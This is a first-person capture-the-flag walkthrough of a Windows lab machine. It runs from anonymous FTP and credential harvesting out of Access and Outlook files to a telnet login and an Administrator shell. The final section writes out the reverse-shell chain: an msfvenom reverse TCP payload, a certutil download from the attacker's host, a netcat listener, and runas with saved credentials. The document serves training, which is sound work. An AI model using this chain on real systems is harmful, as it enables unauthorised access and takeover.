#windows

# Initial nmap scan
![Pasted image 20230221212112](https://user-images.githubusercontent.com/71300144/220948194-fa7d8dce-84c6-48dc-a36f-2b7de0c920a9.png)

I tried to enumerate further for version number on ftp and telnet but could not find any.

# Website on 80
![Pasted image 20230221211811](https://user-images.githubusercontent.com/71300144/220948502-98873781-f08c-4f49-ae2e-527dd2a2d0ba.png)

I imidiately noticed "Lon-MC6" and googled it. I found the following website https://www.192-168-1-1-ip.co/router/echelon/ilon-600/13692/

This website hinted that there might be the "Echelon i.LON 600" running on this machine and possible default credentials I could try on telnet or ftp username "ilon" Password "ilon"

# FTP

I decided to see if the default credentials I found from the quick google search woudld work in ftp, I also just tried the classic admin / admin also before logging in as anonymous.

![Pasted image 20230222211658](https://user-images.githubusercontent.com/71300144/220948944-93dea8fb-5077-44de-8e61-66dbea2395ee.png)

Logged in as anonymous I Found a file called 'Access Control.zip' in an Engineering directory

![Pasted image 20230222211900](https://user-images.githubusercontent.com/71300144/220949448-04da8063-6c29-4f30-a0b9-87306fed51a6.png)

I then went over to the Backup directory and tried to get a file called 'backup.mdb' a microsoft access database but it was not working, I kept getting an error telling 
'WARNING! 337 bare linefeeds received in ASCII mode.' Afte some googling I found that there are two types of modes ascii and binary in this article https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files so I switched to binary and downloaded the file 

![Pasted image 20230222212451](https://user-images.githubusercontent.com/71300144/220949664-40ebd069-819e-4ddd-85dc-017c87257332.png)

# Gobuster

While I was working on FTP I had gobuster in the background going looking for aspx, txt, html, and asp files and found some directories but came back as status 400. 

![Pasted image 20230222083208](https://user-images.githubusercontent.com/71300144/220949894-ef282b5f-b0ea-4a27-96f3-44d8c82e534e.png)

When you browse to these directories you get this error message about a server misconfigurtion in the root directory.

![Pasted image 20230222212745](https://user-images.githubusercontent.com/71300144/220950127-fa2ca898-235d-44c2-b357-606064c5a671.png)

# Trying Telnet

Before I looked at the files I found in FTP, I decided to give telnet a try with the ilon / ilon | admin / admin creds this did not work

![Pasted image 20230222213016](https://user-images.githubusercontent.com/71300144/220950251-af26f19e-d8d2-429a-ae2e-c8673b53a5f4.png)

# Access Control.zip

I first went to unzip the zip file I found in ftp 'Access Control.zip' but this did not work so I tried 7zip and this worked but the file 'Access Control.pst' is password protected.  

![Pasted image 20230222213337](https://user-images.githubusercontent.com/71300144/220950567-7de194e6-6504-4d58-ac79-510e6bc83e35.png)

Before I went to look at the backup.mdb file I decided it would be a good idea to run john in the background to see if I could brute force the password.

![Pasted image 20230222213553](https://user-images.githubusercontent.com/71300144/220950760-4f175deb-2b9a-4e82-b127-ca93704cfb73.png)


# Backup.mdb

As John was running in the background I tried to figure out how to view this microsoft access file on linux. I came across a tool called mdbtools. you can use this tool to view a .mdb file like this 

`mdb-tables backup.mdb` 

but you get a jumbled output that looks like this and is hard to read.

![Pasted image 20230222215747](https://user-images.githubusercontent.com/71300144/220951474-b785fa18-1b7c-47d7-ae52-f2e1ab40a61e.png)
You can use the tr command to make it neat and replace all spaces with new lines, then sort the tables and make them in neat columns with this command

`mdb-tables backup.mdb | tr ' ' '\n' | sort | column`


![Pasted image 20230222215906](https://user-images.githubusercontent.com/71300144/220951894-ea814e8d-bbfd-43ac-9b3a-611b23f622ed.png)

Now that we can read the tables properly, there are some table that sound interesting auth_user, auth_user_groups, etc.

Using the following command `mdb-export backup.mdb auth_user | tr ' ' '\n' | column `, still slightly messy but decodable.We can see that the table consists of 'id,username,password,Status,last_login,RoleID,Remark' and there are three users 'admin, engineer, and backup_admin' Awesome!! Finally found some credentials! 

![Pasted image 20230222220559](https://user-images.githubusercontent.com/71300144/220952136-b23a1d29-eb0f-430c-a0e4-c7e0f2f279a4.png)

Checking back on John to see if we were able to discover any passwords.

![Pasted image 20230222220735](https://user-images.githubusercontent.com/71300144/220952355-036e209b-af23-495c-b6ba-9316e9c377c0.png)

Came up with nothing so now I am going to try the credentials I found on the .mdb file.
***
### Note I also found an online source for viewing Microsoft Access .mdb files which was a lot easier. The website is https://www.mdbopener.com/

![Pasted image 20230221233346](https://user-images.githubusercontent.com/71300144/220952623-de0d8afd-e566-49e1-bf58-4c8a206dcdc4.png)

Trying all the admin passwords first, they did not work but the 'engineer' users password worked 'access4u@security'

![Pasted image 20230222221221](https://user-images.githubusercontent.com/71300144/220953627-67696e95-16f7-47d8-8208-dc50d6678c83.png)

Before I looked at this file I also tried the credentials of all users found on telnet with no success. The 'Access Control.pst' file is a microsoft outlook email file.... This is also hard to view on linux but you can do it with thunderbird which is a free email tht you can get. `sudo apt install thunderbird` but first you have to convert the .pst file into a .mbox file with the kernal-outlook-pst-viewer `sudo apt-get install kernel-outlook-pst-viewer` 

You can do this using the following command 

`readpst 'Access Control.pst'`

![Pasted image 20230222221941](https://user-images.githubusercontent.com/71300144/220953808-4ad0f11a-ee89-4351-9300-053c63481401.png)

You should be able to go into thunderbird now and download the import / export tools add-on and from there import your .mbox file.

Unfortunately the ad-on was not working and I was unable to read import it in thunderbird. I always try to do eveything in linux before looking out toward a website.

I acknowledge I could have just transfered the file to my microsoft machine and imoported the '.pst' file into microsoft outlook but I wanted to see if there was an online option. I found the following. **same with the .mdb file
# Online pst viewer

https://products.aspose.app/email/viewer/pst

![Pasted image 20230222222747](https://user-images.githubusercontent.com/71300144/220953963-0c4f0f90-eff0-4c98-b74b-4ef5bec21bcf.png)

I was able to open and view the file but not copy so I downloaded a txt version of the document 

![Pasted image 20230222222848](https://user-images.githubusercontent.com/71300144/220954140-89112b29-e922-4023-9849-e76b10e93998.png)

Now we know there is a user with the name "security" witth a password of '4Cc3ssC0ntr0ller'

![Pasted image 20230222223002](https://user-images.githubusercontent.com/71300144/220955002-adf37bc4-75c6-40fb-bc56-4a5adbf8820f.png)

There is only one thing left to try this on and it is telnet

![Pasted image 20230222223130](https://user-images.githubusercontent.com/71300144/220955127-06ff7fbc-8a6e-43d1-8d6a-cf7e72a4313d.png)

And we are In Finally!! 

![Pasted image 20230222205617](https://user-images.githubusercontent.com/71300144/220955360-94bb1aaf-28f6-4afb-81f3-f9be6f4c7d5a.png)

To enumerate Further with automation I tried to upload winpeas and run it, but it was blocked, I also tried to upload it again and rename it but it was still blocked. I then tried to upload a different enumeration program called Seatbelt but that too was blocked.

After uploading different automated enumeration programs and trying to run them I decided to start manualy enumerating the system.

I pulled up hacktricks https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

After some time I cam across `cmdkey /list` and found stored credentials. According to Hacktricks we can use these stored credentials to communicate with the windows credential manager and request the credentials for that specific resource from the defualt stored credentials using 'runas.exe'

![Pasted image 20230223085058](https://user-images.githubusercontent.com/71300144/220955526-0c664559-3266-455c-b82b-16ac41afa782.png)

I could not figure out the correct syntax for the runas program provided by hacktricks but I found this websited tha provided just what I needed.
https://juggernaut-sec.com/runas/

This command tests if the default credentials are valid by running the command whoami and saving the output to a txt file called whoami.txt.

![Pasted image 20230223085755](https://user-images.githubusercontent.com/71300144/220955721-af45095a-a2a8-4757-b6b8-00c8d38cda54.png)

It worked! Now all I have to do is get this command to execute a command that gives me a reverse shell. I chose to use msfvenom

![Pasted image 20230222202832](https://user-images.githubusercontent.com/71300144/220956267-6d57b4d7-69a1-4824-a334-551f2e48bfd3.png)

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=9001 -f exe > winshell.exe`

![Pasted image 20230223090559](https://user-images.githubusercontent.com/71300144/220955942-0a93b20c-39f9-4887-9123-86d0d271b589.png)

Now that I have my msfvenom reverse shell payload, I set up a simple python http server `python3 -m http.server 8081` then used `certutil.exe -urlcache -f http://10.10.14.8:8081/winshell.exe` command to download the payload onto the target machine. I then set up my netcat listener `nc -lvnp 9001` and ran the following command.

`runas /env /noprofile /savecred /user:ACCESS\Administrator "winshell.exe"`

![Pasted image 20230223091032](https://user-images.githubusercontent.com/71300144/220956062-f47dfa77-528d-4902-ad81-4958a1f4a0e5.png)

## Box Owned, We have Domain Admin!!
